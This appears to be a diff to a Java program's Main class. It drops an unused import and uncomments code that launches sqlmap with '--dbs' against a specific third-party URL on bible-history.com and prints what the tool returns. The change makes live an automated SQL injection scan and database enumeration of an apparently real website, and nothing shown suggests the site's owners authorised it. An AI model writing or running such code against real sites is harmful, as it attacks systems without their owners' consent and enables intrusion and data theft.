@@ -5,8 +5,6 @@ import java.io.FileReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.util.Iterator;
-
-import com.sun.xml.internal.bind.v2.runtime.output.StAXExStreamWriterOutput;
 import org.json.*;
 
 
@@ -60,30 +58,30 @@ public class Main {
             }
 
 
-//        ProcessBuilder processBuilder = new ProcessBuilder();
-//
-//        processBuilder.command("sqlmap", "-u", "http://www.bible-history.com/subcat.php?id=2","--dbs");
-//
-//        try {
-//
-//            Process process = processBuilder.start();
-//
-//            BufferedReader readerTwo =
-//                    new BufferedReader(new InputStreamReader(process.getInputStream()));
-//
-//            String line;
-//            while ((line = readerTwo.readLine()) != null) {
-//                System.out.println(line);
-//            }
-//
-//            int exitCode = process.waitFor();
-//            System.out.println("\nExited with error code : " + exitCode);
-//
-//        } catch (IOException e) {
-//            e.printStackTrace();
-//        } catch (InterruptedException e) {
-//            e.printStackTrace();
-//        }
+        ProcessBuilder processBuilder = new ProcessBuilder();
+
+        processBuilder.command("sqlmap", "-u", "http://www.bible-history.com/subcat.php?id=2","--dbs");
+
+        try {
+
+            Process process = processBuilder.start();
+
+            BufferedReader readerTwo =
+                    new BufferedReader(new InputStreamReader(process.getInputStream()));
+
+            String line;
+            while ((line = readerTwo.readLine()) != null) {
+                System.out.println(line);
+            }
+
+            int exitCode = process.waitFor();
+            System.out.println("\nExited with error code : " + exitCode);
+
+        } catch (IOException e) {
+            e.printStackTrace();
+        } catch (InterruptedException e) {
+            e.printStackTrace();
+        }
 
         }
     }
